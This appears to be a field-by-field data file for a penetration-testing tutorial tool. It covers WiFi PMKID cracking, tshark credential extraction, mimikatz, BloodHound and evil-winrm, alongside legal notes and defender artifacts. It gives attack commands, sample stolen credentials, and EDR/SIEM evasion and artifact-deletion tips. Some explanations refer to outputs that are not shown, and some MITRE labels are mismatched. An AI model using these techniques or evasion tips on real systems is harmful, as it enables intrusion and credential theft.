sample_outputs.explanation: hcxdumptool captured 3 usable PMKIDs passively — no deauth frames sent, no client disconnected. The PMKID is computed as HMAC-SHA1(PMK, 'PMK Name' || AP_MAC || Client_MAC), meaning it's derivable from the PSK alone and can be captured from a single beacon/association exchange. hcxpcapngtool converts the pcapng to hashcat's 22000 format (unified WPA format supporting both PMKID and EAPOL). Hashcat with best64.rule applies 64 common transformations (append digits, capitalize, leet substitution) to each base word — 'Acme2024!' was derived from a base word 'acme2024' with capitalization and symbol append rules. Next steps: (1) use aircrack-ng as a validation fallback: 'aircrack-ng -w <(echo "Acme2024!") -b AA:BB:CC:11:22:33 pmkid_capture.pcapng' to confirm the PSK before reporting; (2) pivot to network access — connect to CorpIoT_PSK and run nmap against the RFC1918 range to enumerate IoT segment; (3) check for VLAN segmentation bypass — IoT VLANs are frequently misconfigured with reachability to corporate segments via inter-VLAN routing; (4) document PMKID hash, cracked PSK, and capture timestamp for the engagement report.

legal_notes: US CFAA (18 U.S.C. § 1030): Capturing wireless traffic from networks you do not own or have explicit written authorization to test is a federal crime under the CFAA, regardless of whether the network is 'open' or uses weak encryption. The deauth attack (aireplay-ng -0) is additionally a violation of 18 U.S.C. § 1030(a)(5) — intentional impairment of a protected computer — because it disrupts service to legitimate clients. 'I was just testing my own security' is not a defense if the adapter captures frames from neighboring APs on the same channel.

Rules of Engagement scope: Wireless engagements require explicit BSSID-level authorization in the SOW — not just 'the building at 123 Main St.' RF does not respect property lines. Your adapter in monitor mode on channel 6 captures frames from every AP and client on channel 6 within range, including neighboring businesses and residential networks. The engagement scope must specify: authorized BSSIDs (by MAC), authorized channels, authorized time windows, and whether deauth is permitted (many clients explicitly prohibit it due to business disruption risk).

Modern cloud/MDM consideration: Enterprise WPA2-Enterprise networks using 802.1X with certificate-based authentication (EAP-TLS) are not vulnerable to PSK cracking — there is no shared secret to crack. However, rogue AP / evil twin attacks against WPA2-Enterprise can capture MSCHAPv2 credentials (EAP-PEAP/MSCHAPv2) which are then crackable offline. Deploying a rogue AP during an engagement requires explicit authorization beyond standard wireless testing scope and may trigger additional legal exposure under wiretapping statutes (18 U.S.C. § 2511) if client credentials are captured.
false_positives: Handshake captured but never cracks: The most common failure mode. airodump-ng will report 'WPA handshake: AA:BB:CC:DD:EE:FF' after capturing as few as 2 of the 4 EAPOL frames — specifically frames 2 and 3 are sufficient for cracking, but frames 1 and 4 alone are not. A 'handshake' captured during a noisy deauth flood may contain only frames 1+4 from one exchange and 2+3 from a different exchange with a different ANonce, producing a structurally valid-looking capture that will never crack. Validate with 'cowpatty -r capture.cap -s ESSID -d /dev/null' — it will report 'incomplete 4-way exchange' on bad captures.

BSSID filter misses the target: On dual-band APs, the 2.4GHz and 5GHz radios have different BSSIDs (typically sequential MACs). Filtering airodump-ng with '-b AA:BB:CC:DD:EE:FF' on the 2.4GHz BSSID will miss handshakes occurring on the 5GHz radio. If clients are 5GHz-only (most modern devices prefer 5GHz), you'll capture zero handshakes despite a successful deauth. Run airodump-ng without a BSSID filter first to enumerate all BSSIDs for the target ESSID.

Deauth succeeds but client reconnects to a different AP: In enterprise environments with multiple APs sharing the same ESSID (roaming), deauthing a client from AP-1 may cause it to roam to AP-2 on a different channel. Your airodump-ng is locked to AP-1's channel and misses the handshake entirely. Solution: run airodump-ng without --channel lock (let it hop) during the deauth phase, accepting noisier capture in exchange for catching the roam handshake.

WPA2-Enterprise misidentified as WPA2-PSK: airodump-ng's ENCRYPTION column shows 'WPA2' for both PSK and Enterprise networks. The AUTH column distinguishes them: 'PSK' vs 'MGT' (management/802.1X). Operators who filter only on ENCRYPTION will attempt PSK handshake capture against Enterprise networks, capture EAPOL frames that look like a handshake, and spend hours on a wordlist attack against a hash that has no PSK to recover.

Channel interference producing corrupt captures: 2.4GHz channels 1, 6, and 11 are the only non-overlapping channels. If the target AP is on channel 6 and a neighboring AP is also on channel 6 with heavy traffic, airodump-ng captures interleaved frames from both networks. The resulting .cap file may contain partial EAPOL sequences from the target interleaved with frames from the neighbor, producing a corrupt handshake. Symptom: cowpatty or hashcat reports 'MIC mismatch' on every password including the correct one. Fix: capture during low-traffic periods or use directional antenna to reduce neighbor interference.

mitre_attack.name: Network Denial of Service: Direct Network Flood

wireshark.description: The world's most widely used network protocol analyzer. Captures and dissects live network traffic or analyzes saved PCAP files. Decodes 2000+ protocols including HTTP, DNS, SMB, TLS (with keys), SSH metadata, and more. Essential for incident response and network forensics.
wireshark.teach_intro: Wireshark sees every packet on the network. HTTP traffic is fully readable — usernames, passwords, session tokens all visible in plaintext. Even encrypted traffic reveals connection patterns, timing, and metadata. For forensics, a PCAP file is a complete record of everything that happened on the network.

-i.label: Interface
-i.desc: Capture on a specific network interface.
-i.teach: Specify the interface to capture on. Use 'ip link show' to list interfaces. wlan0 for WiFi, eth0 for Ethernet, lo for loopback.

-r.label: Read PCAP File
-r.desc: Open an existing packet capture file.
-r.teach: PCAP files are recordings of network traffic. Open them to analyze after the fact — incidents, CTF challenges, or saved captures.

-f.label: Capture Filter
-f.desc: BPF syntax filter applied during capture: 'host 192.168.1.1' or 'port 80'
-f.teach: Capture filters (BPF syntax) filter before writing to disk. Display filters (in the GUI) filter after capture. Always use capture filters on high-traffic networks.

-Y.label: Display Filter
-Y.teach: Display filters let you find specific traffic. 'http.request' shows all HTTP requests. 'dns' shows all DNS. 'smb2' shows SMB. 'frame contains password' searches all packets for the word password.

tshark.label: TShark (CLI)
tshark.desc: Command-line version of Wireshark. Perfect for scripting and remote captures.
tshark.teach: TShark is Wireshark without the GUI. Use it on headless servers, in scripts, or over SSH. tshark -r file.pcap -T fields -e http.request.uri extracts all HTTP URLs.

opsec_notes: BEGINNER — Wireshark itself generates no network traffic when reading a saved PCAP file (-r mode). However, running it in live capture mode (-i) on a host you don't own is itself a form of unauthorized interception. The act of capturing is the risk, not the tool's UI.

CONCRETE ARTIFACT — On Windows, launching Wireshark creates a process tree: wireshark.exe spawning dumpcap.exe as a child. Sysmon EID 1 (Process Create) will log both, with command-line arguments including the interface name and any capture filter. Defender for Endpoint's process tree view flags dumpcap.exe spawned from unexpected parents (e.g., a web server process) as anomalous.

CUTTING-EDGE 2025-2026 — CrowdStrike Falcon's behavioral engine scores dumpcap.exe and tshark.exe execution by parent process context. A red-teamer running tshark from a C2 beacon's shell will generate a high-severity alert due to parent-child anomaly: [beacon.exe] -> [cmd.exe] -> [tshark.exe]. Prefer pre-positioned capture via a legitimate monitoring agent or LOLBin-based packet capture (netsh trace start) to avoid this signature.

CUTTING-EDGE 2025-2026 — SentinelOne's STAR rules (as of 2025 policy updates) flag raw socket access and promiscuous mode interface changes via ETW-TI (Threat Intelligence ETW channel). On Windows 11 22H2+, kernel callbacks registered by the minifilter driver layer will surface promiscuous mode toggle events to EDR sensors before the first packet is captured. This means the detection fires before you see any traffic.

CONCRETE ARTIFACT — On Linux, enabling promiscuous mode on an interface writes to /var/log/syslog and generates a kernel audit event (auditd type=SYSCALL with comm=dumpcap). Any SIEM ingesting auditd logs will see: 'device eth0 entered promiscuous mode' in dmesg and the corresponding audit record with UID/PID. This is a reliable defender artifact.

TLS decryption via SSLKEYLOGFILE requires the key material to be present on the capture host. Exfiltrating a target's SSLKEYLOGFILE or NSS key log alongside a PCAP is a two-artifact chain — both files together constitute a complete credential/session exposure. Handle both under the same data classification as plaintext credentials in your rules of engagement.

sample_outputs.scenario: Beginner — analyst opens a PCAP from a CTF challenge and filters for HTTP POST requests to find submitted credentials
sample_outputs.command: tshark -r capture.pcap -Y "http.request.method == POST" -T fields -e http.host -e http.request.uri -e http.file_data
sample_outputs.output:
http.host            http.request.uri     http.file_data
login.corp.local     /auth/login          username=jsmith&password=Winter2024!
login.corp.local     /auth/login          username=admin&password=P@ssw0rd123
api.corp.local       /v1/token            grant_type=password&username=svc_backup&password=Backup$ecure99
login.corp.local     /auth/login          username=jsmith&password=Winter2024!
api.corp.local       /v1/upload           filename=report.xlsx&session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoianNtaXRoIn0.XXXX
sample_outputs.explanation: Each row is one HTTP POST body captured in plaintext. The fields -e flags tell tshark to extract only those three columns instead of dumping full packet decode. What you're seeing: (1) jsmith's password submitted twice — likely a failed login then success, (2) a service account 'svc_backup' authenticating to an API with a hardcoded credential — high-value lateral movement target, (3) a JWT session token in the upload request — this token can be replayed directly in Burp Suite or curl without knowing the password. Next steps: (a) take svc_backup:Backup$ecure99 into crackmapexec against the domain to check for reuse, (b) decode the JWT at jwt.io to identify claims and expiry, (c) replay the session token with curl -H 'Authorization: Bearer <token>' against api.corp.local to enumerate accessible endpoints.

sample_outputs.scenario: Advanced — incident responder analyzes a PCAP from a suspected Kerberoasting + lateral movement incident, hunting for AS-REQ/TGS-REQ patterns and SMB lateral movement
sample_outputs.command: tshark -r incident_2025-06-01.pcap -Y "kerberos || smb2" -T fields -e frame.time -e ip.src -e ip.dst -e kerberos.msg_type -e kerberos.CNameString -e kerberos.sname -e smb2.cmd -e smb2.filename 2>/dev/null | head -40
sample_outputs.explanation: This output tells a complete story in 12 lines. Kerberos msg_type 10/11 = AS-REQ/AS-REP (TGT request) — jsmith authenticated at 03:14:22, suspicious for 3am. Msg_type 12/13 = TGS-REQ/TGS-REP — jsmith immediately requested service tickets for MSSQLSvc, HTTP/sharepoint, and CIFS/dc01 in rapid succession (~8ms apart). This pattern — bulk TGS requests within milliseconds — is the Kerberoasting enumeration signature (Rubeus kerberoast /all). A human operator would space these out. Then 2.7 seconds later, SMB2 cmd=3 (TreeConnect) to ADMIN$ on 10.10.5.15, followed by a file write of PSEXESVC.EXE — this is PsExec lateral movement. The kill chain is confirmed: credential compromise -> Kerberoasting -> PsExec pivot. Next steps: (a) run Bloodhound against the domain to map jsmith's ACL path to dc01, (b) pull the TGS-REP encrypted blobs from the PCAP with impacket's GetUserSPNs.py --dc-ip or extract from the PCAP directly with tshark -Y 'kerberos.msg_type == 13' -T fields -e kerberos.cipher for offline cracking with hashcat mode 13100, (c) check 10.10.5.15's Sysmon EID 7045 (service install) for PSEXESVC around 03:14:26 to confirm execution.

legal_notes: US CFAA (18 U.S.C. § 2511 / Wiretap Act intersection): Capturing live network traffic on a network you do not own or have explicit written authorization to monitor constitutes unlawful interception under the Electronic Communications Privacy Act, independent of the CFAA. 'I was on the same WiFi' is not authorization. Written scope must explicitly include packet capture, not just 'network testing'.

Rules of engagement scope: PCAP files captured during an engagement contain data belonging to the client — employee credentials, PII, internal communications, attorney-client privileged data. Your ROE must specify data handling: how long you retain PCAPs, whether you can exfiltrate them off-site for analysis, and mandatory destruction timelines. Retaining a PCAP after engagement close without explicit authorization is a data breach, not a pentest artifact.

Cloud/modern-AD consideration: In AWS environments, VPC Traffic Mirroring requires explicit IAM permissions (ec2:CreateTrafficMirrorSession) and is logged to CloudTrail. Enabling traffic mirroring without authorization is a billable action that leaves a permanent CloudTrail record with your IAM principal. In Azure, Network Watcher packet capture requires the NetworkWatcherContributor role and logs to the Activity Log — both are trivially auditable by the defender.
false_positives: TLS 1.3 with encrypted SNI (ESNI/ECH) will show the destination IP but not the hostname in the ClientHello. Analysts who assume 'no SNI = no hostname' will miss the destination — use passive DNS correlation against the IP instead of relying on the SNI field.

VLAN tagging (802.1Q) causes Wireshark to show traffic on the wrong interface or miss it entirely if the capture interface doesn't have the 802.1Q tag stripped. On a trunk port, you'll see all VLANs; on an access port, you'll only see the native VLAN. Analysts frequently conclude 'no traffic to VLAN 20' when they're simply not capturing on the right interface or the tag is being stripped upstream.

TCP retransmissions and out-of-order segments cause Wireshark's TCP stream reassembly to show duplicate data or garbled application-layer content. A credential submitted over a lossy link may appear twice in the HTTP follow-stream, or the POST body may appear fragmented across two segments — analysts may miss it if they only look at the first packet of a stream.

Timestamps in a PCAP reflect the capture host's clock, not the network's ground truth. If the capture machine's NTP was drifting or the PCAP was collected from a VM with clock skew, correlating Wireshark timestamps against SIEM events (which use server-side NTP) will produce false timeline mismatches — a 'lateral movement at 03:14' in the PCAP may appear as '03:16' in Splunk.

Wireshark's protocol dissectors can misidentify traffic on non-standard ports. A C2 beacon running HTTPS on port 8443 will be correctly decoded as TLS, but a custom binary protocol on port 443 may be decoded as TLS and show garbage — or worse, partially decoded as a known protocol, hiding the actual payload. Always verify dissector assumptions with 'Decode As' when traffic on a well-known port looks malformed.

mitre_attack.name: Credentials In Files — captured from plaintext protocols

mimikatz.description: Windows credential extraction tool. Dumps plaintext passwords, NTLM hashes, Kerberos tickets, and certificates from Windows memory (LSASS). The most dangerous credential tool in existence — runs after gaining admin access.
mimikatz.teach_intro: Mimikatz reads from LSASS (Local Security Authority Subsystem Service), the Windows process that manages authentication. When users log in, LSASS caches their credentials in memory for convenience. Mimikatz extracts them — often including plaintext passwords for recently logged-in users.

sekurlsa::logonpasswords.label: Dump Logon Passwords
sekurlsa::logonpasswords.desc: Extract plaintext passwords and NTLM hashes from LSASS memory.
sekurlsa::logonpasswords.teach: The holy grail. Shows all currently cached credentials: username, domain, NTLM hash, and sometimes plaintext password. Requires SYSTEM or local admin.

sekurlsa::wdigest.label: WDigest Credentials
sekurlsa::wdigest.desc: Show plaintext passwords cached by the WDigest protocol.
sekurlsa::wdigest.teach: WDigest caches plaintext passwords for legacy SSO. Disabled in Win8.1+ but can be re-enabled via registry. Legacy servers still have it on.

sekurlsa::tickets.label: Kerberos Tickets
sekurlsa::tickets.desc: List and export Kerberos tickets from memory.
sekurlsa::tickets.teach: Kerberos tickets let you authenticate without a password. Exported .kirbi files can be used with Pass the Ticket attacks or Kerberoasting.

lsadump::sam.label: SAM Database
lsadump::sam.desc: Dump local account hashes from the SAM database.
lsadump::sam.teach: SAM holds local account hashes. Requires SYSTEM. Hashes are in NTLM format — crack with hashcat or pass directly.

lsadump::dcsync.label: DCSync Attack
lsadump::dcsync.desc: Impersonate a DC and request password hashes via replication protocol.
lsadump::dcsync.teach: DCSync doesn't touch LSASS — it uses replication protocols to request hashes from the DC. Stealthier than running on the DC itself. Requires DA or replication rights.

kerberos::golden.label: Golden Ticket
kerberos::golden.desc: Forge a Kerberos ticket granting ticket (TGT) using the KRBTGT hash.
kerberos::golden.teach: Golden Ticket is god-mode in AD. With the KRBTGT hash you create valid Kerberos tickets for ANY user including non-existent ones — works for 10 years. Full domain persistence.

privilege::debug.label: Enable Debug Privilege
privilege::debug.desc: Required before accessing LSASS. Run first.
privilege::debug.teach: Debug privilege allows reading other process memory including LSASS. Always run this first or credential extraction commands will fail.

token::elevate.label: Token Impersonation
token::elevate.desc: Impersonate SYSTEM token for higher privileges.
token::elevate.teach: Elevates to SYSTEM even if running as admin. SYSTEM has more rights than admin on Windows. Required for some credential operations.

bloodhound.description: Active Directory attack path mapping tool. Collects AD relationships and visualizes them as a graph, showing the shortest paths from any compromised account to Domain Admin. Reveals privilege escalation paths that would take days to find manually.
bloodhound.teach_intro: BloodHound thinks of Active Directory as a graph where users, groups, computers, and GPOs are nodes connected by edges (relationships). It finds attack paths like: you own user A → user A is local admin on computer B → computer C's admin is logged into B → C's admin is in Domain Admins. Each hop is a lateral movement opportunity.

SharpHound.label: Data Collector (Windows)
SharpHound.desc: Windows collector that gathers AD data. Run as domain user.
SharpHound.teach: SharpHound collects from Windows. -c All gathers everything: sessions, ACLs, trusts, GPOs. Output is a zip of JSON files you import into BloodHound.

bloodhound-python.label: Python Collector (Linux)
bloodhound-python.desc: Linux-based collector. Run from Kali with domain credentials.
bloodhound-python.teach: Linux collector — no need to run anything on Windows. Requires valid domain credentials. -c All collects sessions, ACLs, trusts. Import the resulting JSON files into BloodHound.

-c All.label: Collect Everything
-c All.desc: Collect all data types: Session, ACL, ObjectProps, Trusts, LocalAdmin, RDP, DCOM, PSRemote.
-c All.teach:
All collection methods give you the most complete graph. Session data shows which users are logged into which computers right now — critical for finding paths.

Collect everything (Users, Groups, Sessions, ACLs, Trusts)

Find Shortest Paths to DA.label: Attack Path to DA
Find Shortest Paths to DA.desc: Built-in BloodHound query: find paths from owned nodes to Domain Admins.
Find Shortest Paths to DA.example: In BloodHound GUI: Analysis → Find Shortest Paths to Domain Admins
Find Shortest Paths to DA.teach: The killer feature. Mark your compromised accounts as Owned, then run this query. BloodHound shows every attack path. Focus on paths with the fewest hops.

Kerberoastable Accounts.label: Find Kerberoastable Users
Kerberoastable Accounts.desc: Find service accounts with SPNs that can be Kerberoasted.
Kerberoastable Accounts.example: In BloodHound GUI: Analysis → Find all Kerberoastable Users
Kerberoastable Accounts.teach: Kerberoastable accounts have SPNs — request their service tickets, extract, crack offline. Service accounts often have weak passwords and excessive privileges.

--dns-tcp.label: --dns-tcp
--dns-tcp.teach: Use TCP for DNS (if UDP fails)

output_read.meaning: the attack path you want
full control over that object — huge privilege
can modify permissions — abuse to grant yourself GenericAll
right to pull all password hashes from the DC
extract their hashes offline without admin

opsec_notes: BEGINNER NOISE: SharpHound's default '-c All' collection floods the domain with LDAP queries — thousands of requests in seconds against the Domain Controller. Any SIEM with baseline LDAP query volume alerting (e.g., Splunk ES, Microsoft Sentinel) will fire immediately. A human analyst watching the DC event log will see Event ID 4662 (Object operation performed) spike to thousands of entries in under a minute.

CONCRETE ARTIFACT — Windows Security Event Log: SharpHound running as a domain user generates a dense burst of EID 4662 (LDAP reads on AD objects) and EID 4624 (logon events) on every DC it touches. The source IP and username are logged in plaintext. Defenders with 'LDAP query volume per user per minute' thresholds set below 500 will catch default SharpHound runs every time.

CUTTING-EDGE 2025-2026 — CrowdStrike Falcon Behavioral Detection: Falcon's Identity Protection module (formerly Preempt) baselines normal LDAP enumeration patterns per user. SharpHound's characteristic query sequence — querying all user objects, then all group memberships, then all computer objects, then ACLs in rapid succession — matches a known Falcon behavioral indicator. As of Falcon sensor 7.x, this triggers a 'LDAP Reconnaissance' medium-severity detection even when SharpHound is renamed or run from memory via Cobalt Strike's execute-assembly.

CUTTING-EDGE 2025-2026 — Microsoft Defender for Identity (MDI) Signature: MDI has a dedicated detection called 'Active Directory attributes reconnaissance using LDAP' that fires specifically on the LDAP filter patterns SharpHound uses (e.g., querying (objectClass=user) with large page sizes, then (objectClass=group), then nTSecurityDescriptor attributes for ACL collection). MDI correlates these across the 30-second collection window and alerts with the source account and workstation. Evasion: use '--CollectionMethods DCOnly' to query only the DC via LDAP without touching member computers via SMB/RPC, reducing the signature footprint significantly.

STEALTH COLLECTION — Throttling and Loop: bloodhound-python and SharpHound both support '--Loop' and '--LoopDuration' flags to spread collection over hours instead of seconds. Pairing '--Throttle 2000' (2-second delay between requests) with '--Jitter 50' (50% random jitter) makes the LDAP query rate indistinguishable from a normal admin script. This defeats volume-based detections but not MDI's pattern-based detection, which keys on query *type* not *rate*.

ARTIFACT ON DISK: SharpHound writes ZIP files to the current working directory by default (e.g., '20250514153022_BloodHound.zip'). The timestamp in the filename is forensically significant. Running SharpHound from a writable network share or a user's %TEMP% directory leaves a recoverable artifact. Use '--OutputDirectory' to redirect to a path that will be wiped, and delete the ZIP immediately after import. The BloodHound CE database on the operator's machine is also a significant artifact — it contains a full map of the target AD environment.

sample_outputs.scenario: Beginner: Freshly compromised domain user account on a Windows 10 workstation inside a small corporate domain. Operator runs SharpHound with default flags to collect everything and understand what paths exist. Goal: find any path to Domain Admin.

sample_outputs.explanation: SharpHound collected 847 AD objects (users, groups, computers, GPOs, ACLs) in about 9 seconds and zipped them into '20250514153022_BloodHound.zip'. The timestamp in the filename is the exact collection time — forensically significant. The 'Resolved Collection Methods' line tells you exactly what data was gathered: Group memberships, local admin relationships, active sessions, ACLs, and more. Upload this ZIP to the BloodHound CE web UI (default: http://localhost:8080). Once imported, run the pre-built query 'Find Shortest Paths to Domain Admins' from the Analysis tab. BloodHound will draw a graph showing every hop between your current user and DA. Next steps: (1) Look for 'GenericAll' or 'WriteDACL' ACL edges — these are often the fastest paths. (2) Check 'Shortest Paths to Unconstrained Delegation Systems' — those machines can be used to capture TGTs. (3) Note the RAM usage (94 MB) — on a monitored endpoint, this memory spike from a non-standard process is visible to EDR process telemetry.

Goal: stealthy DC-only collection to map ACL-based paths without touching member workstations via SMB, then chain to a specific attack path.

sample_outputs.explanation: DCOnly collection mode queries only the Domain Controller via LDAP — it never touches member workstations via SMB/RPC, which is the noisiest part of full collection and the part MDI correlates across hosts. The '--throttle 3000 --jitter 75' flags spread requests over time with randomized delays, defeating volume-based SIEM rules. The WARNING about gc._msdcs.corp.local is expected when '--dns-tcp' is used in environments where the Global Catalog SRV record isn't resolvable via TCP — it doesn't affect collection quality for a single-domain environment. After importing the ZIP into BloodHound CE: (1) Run 'Find Principals with DCSync Rights' — svc_backup accounts are frequently over-permissioned with DS-Replication-Get-Changes-All. (2) Run 'Shortest Paths from Owned Principals' after marking 'svc_backup' as owned — look for 'WriteOwner' or 'GenericWrite' edges to high-value groups. (3) If a path involves a computer object with 'AllowedToAct' edges, that's a Resource-Based Constrained Delegation (RBCD) abuse path — follow up with impacket's rbcd.py and getST.py to forge a service ticket. (4) Cross-reference any Kerberoastable accounts found ('Kerberoastable Accounts' query) with the ACL paths — a Kerberoastable account with 'GenericAll' on a DA-adjacent group is a two-step compromise.

legal_notes: CFAA BOUNDARY: BloodHound collection requires authenticating to the target domain's LDAP service and querying Active Directory objects. Under 18 U.S.C. § 1030, this constitutes 'accessing a computer' — even with valid credentials, doing so without explicit written authorization from the domain owner is a federal crime. A compromised credential does not grant legal authorization. Your rules of engagement must explicitly authorize AD enumeration, LDAP queries, and the specific domain(s) in scope.

SCOPE CREEP RISK: BloodHound's graph analysis frequently reveals trust relationships to domains outside your authorized scope (forest trusts, external trusts, Azure AD Connect sync accounts). Querying, mapping, or exploiting paths that cross into an out-of-scope domain — even if the path is visible in the graph — violates your rules of engagement and potentially the CFAA. Before following any cross-domain path, verify with your client that the target domain is in scope.

MODERN AD / AZURE CONSIDERATION: In hybrid environments, BloodHound CE's AzureHound collector maps Azure AD (Entra ID) objects and their relationships to on-premises AD. AzureHound requires an Azure access token and makes Microsoft Graph API calls that are logged in the Entra ID audit log under 'Directory' category. Ensure your authorization explicitly covers Azure AD enumeration — many clients treat their cloud tenant as a separate authorization boundary from their on-premises AD, even when they are hybrid-joined.
false_positives: SESSION DATA IS STALE: BloodHound's 'HasSession' edges (showing which users are logged into which computers) reflect a point-in-time snapshot. A session shown in the graph may have ended minutes after collection. Operators who plan lateral movement based on session data and wait hours before executing will find the target user has logged off. Always re-verify active sessions with CrackMapExec ('cme smb <target> --sessions') or net session immediately before moving.

LOCAL ADMIN PATHS VIA GPO ARE OFTEN WRONG: BloodHound infers local admin relationships from GPO membership (GPOLocalGroup collection). If a GPO that grants local admin rights has been linked but not yet applied (Group Policy refresh cycle is up to 90 minutes), or if the GPO is linked to an OU but the computer has been moved out of that OU, BloodHound will show a 'AdminTo' edge that doesn't exist in practice. Verify with 'net localgroup administrators' on the target before relying on GPO-derived admin paths.

ACLS ON DELETED OBJECTS: BloodHound sometimes ingests ACL entries for objects that have been deleted from AD but whose SIDs remain in ACLs on live objects (orphaned SIDs). These appear as unresolved nodes in the graph and can make a path look broken when it isn't, or suggest a path exists to an object that no longer exists. Always check whether a node resolves to a live AD object before building an attack chain around it.

PROTECTED USERS GROUP BREAKS ASSUMED PATHS: If a target account is a member of the Protected Users security group (enforced in all hardened 2022+ domains), Kerberos delegation, NTLM authentication, and RC4 encryption are disabled for that account. BloodHound does not always surface Protected Users membership as a blocking condition on attack paths. A path that looks like 'Kerberoast user X → GenericAll on DA group' will fail silently if user X is in Protected Users, because their TGS will use AES-256 only and their account cannot be delegated.

DCOM AND PSREMOTE EDGES REQUIRE SPECIFIC FIREWALL RULES: BloodHound marks 'ExecuteDCOM' and 'CanPSRemote' edges based on group membership (local DCOM users, Remote Management Users). These edges assume the firewall allows WMI (TCP 135 + dynamic RPC) or WinRM (TCP 5985/5986) traffic. In segmented networks with host-based firewalls, these edges frequently exist in the graph but are not exploitable from the operator's current pivot point. Always verify network reachability before assuming a DCOM or PSRemote edge is usable.
bloodhound.teach_alt: Active Directory attack path mapper — visualizes paths to Domain Admin

evil-winrm.description: Windows Remote Management shell for pentesting. Provides a fully functional PowerShell session with extra features: file upload/download, in-memory .NET assembly loading, Pass the Hash, Kerberos auth, and bypass for AMSI and logging.
evil-winrm.teach_intro: WinRM is Windows' built-in remote management protocol on port 5985/5986. Evil-WinRM connects to it and gives you a feature-rich shell. It's cleaner than a reverse Meterpreter session for interactive work — you get tab completion, history, and PowerShell's full power.

-i.label: Target IP
-i.teach: WinRM must be enabled on the target (it's on by default on Windows Server 2012+). Port 5985 (HTTP) or 5986 (HTTPS).

-u.label: Username
-u.teach: Any user with WinRM access works. Local admins, domain admins, and users in the Remote Management Users group.

-p.label: Password
-p.teach: Plaintext password authentication. If you have an NTLM hash instead, use -H for Pass the Hash.

-H.label: NT Hash (Pass the Hash)
-H.desc: Authenticate using NTLM hash instead of plaintext password.
-H.teach: Pass the Hash — no password needed! Dump the NTLM hash with mimikatz or secretsdump, pass it directly here. No cracking required.

-s.label: PS Scripts Path
-s.desc: Path to PowerShell scripts to load in memory.
-s.teach: Scripts are loaded into memory without touching disk. Invoke-Mimikatz, PowerView, AMSI bypass scripts — all available via tab completion.

-e.label: .NET Executables Path
-e.desc: Path to .NET executables to load via Invoke-Binary.

opsec_notes: Beginner noise: Evil-WinRM connects to TCP 5985 (HTTP) or 5986 (HTTPS). Any network flow monitor, firewall log, or SIEM ingesting Windows Firewall logs will record the inbound connection with source IP, destination port, and timestamp. Your attacking machine's IP is in the logs the moment you connect — there is no stealth at the network layer without proxying through a compromised host already inside the environment.

Concrete defender artifact: Every successful WinRM authentication generates Windows Security Event ID 4624 (Logon Type 3, Network) and Event ID 4672 (Special Privileges Assigned) on the target host. These are written to the Security event log at C:\Windows\System32\winevt\Logs\Security.evtx. Blue teams with a SIEM ingesting Windows event logs will see your username, source IP, and logon time in near-real-time.

WinRM sessions also generate Microsoft-Windows-WinRM/Operational log entries (Event IDs 6, 8, 15, 16, 31, 33) under Applications and Services Logs. Defenders hunting lateral movement specifically watch this provider for unusual source hosts or service accounts authenticating interactively.

2025-2026 cutting edge — CrowdStrike Falcon and SentinelOne both instrument WinRM-spawned PowerShell processes via kernel ETW (Event Tracing for Windows) callbacks registered at the process creation level. The parent-child relationship wsmprovhost.exe -> powershell.exe (or wsmprovhost.exe -> cmd.exe) is a high-fidelity detection signal. Falcon's Fusion rules and SentinelOne's STAR rules both have out-of-the-box detections for this tree. Running your post-exploitation commands directly in the Evil-WinRM shell means every command goes through this monitored parent.

2025-2026 cutting edge — Evil-WinRM's built-in AMSI bypass patches the AmsiScanBuffer function in memory. Microsoft Defender for Endpoint (MDE) on Win11 22H2+ and Server 2022 with Tamper Protection enabled monitors for AMSI provider patch attempts via ETW-TI (Threat Intelligence) callbacks and Sysmon Event ID 8 (CreateRemoteThread) or EID 10 (ProcessAccess) if Sysmon is deployed. The bypass is well-signatured; assume it will alert on any hardened 2024+ endpoint. Consider loading a custom, obfuscated AMSI bypass via the -s scripts path instead of relying on the built-in.

Pass-the-Hash (-H flag) with an NT hash does not require the plaintext password but still produces the same Event ID 4624 Logon Type 3 on the target. However, it will NOT produce a Kerberos TGT — it uses NTLM authentication, which is increasingly flagged by Defender for Identity (MDI) and Azure AD Identity Protection as a suspicious authentication event, especially if the account normally authenticates via Kerberos. NTLM authentication from a new source host for a privileged account is a Tier-1 MDI alert in 2025 environments.

legal_notes: CFAA boundary: Authenticating to a WinRM endpoint with credentials or hashes you obtained from a prior compromise — even if those credentials are valid — constitutes unauthorized access under 18 U.S.C. § 1030 if you do not have written authorization covering that specific host. 'I had the password' is not a legal defense. Your rules of engagement must explicitly list the target IP or subnet, and WinRM lateral movement to hosts not in scope is a separate CFAA violation even during an authorized engagement.

Scope and authorization: Pass-the-Hash attacks frequently allow access to hosts that were not originally in the agreed engagement scope — a hash recovered from Host A may authenticate to Host B, C, and D. Before using -H to pivot to any new host, verify that host is within your written scope. Many organizations have out-of-scope systems (HR servers, finance systems, OT/ICS jump hosts) on the same domain. Accessing them, even accidentally, can void your engagement contract and create legal liability. Confirm with your client before each lateral move.

Cloud and hybrid AD consideration: In environments using Azure AD Connect or Entra ID hybrid join, WinRM access to on-premises systems may be authenticated via synchronized credentials that also exist in Entra ID. Successful WinRM sessions against hybrid-joined hosts can trigger Entra ID Identity Protection risk events and Microsoft Defender for Identity alerts that are visible to the client's cloud security team — even if your engagement scope was described as 'on-premises only.' Clarify with the client whether cloud-side alerting is in or out of scope before proceeding.
false_positives: WinRM access denied errors do not reliably distinguish between 'WinRM is disabled,' 'the account lacks WinRM permissions,' 'the account is valid but not in the Remote Management Users group,' and 'the firewall is blocking 5985 but the port scanner said it was open.' Evil-WinRM will return a generic connection refused or authentication failure for all of these. Validate WinRM is actually enabled on the target with 'Test-WSMan' from a Windows host or check for the HTTP 401 response on port 5985 with curl before assuming credentials are wrong.

Pass-the-Hash with -H will silently fail if the target has LocalAccountTokenFilterPolicy set to 0 (the default on modern Windows) and you are attempting to authenticate as a local (non-domain) account. Remote UAC filtering will allow the connection but drop you into a filtered token with no administrative rights, even though the shell opens successfully. You will see the prompt but commands requiring elevation will fail. Check with 'whoami /groups' — if 'Mandatory Label\Medium Mandatory Level' appears instead of High, you hit this filter.

The built-in AMSI bypass in Evil-WinRM is not guaranteed to succeed and does not produce an error message when it fails. If AMSI patching is blocked by Tamper Protection or a third-party EDR, your subsequent PowerShell commands that load offensive tooling will be silently scanned and may be blocked or killed without obvious feedback in the shell. Always test AMSI bypass success explicitly with a benign AMSI test string (e.g., 'AmsiScanBuffer' invocation) before loading sensitive tooling.

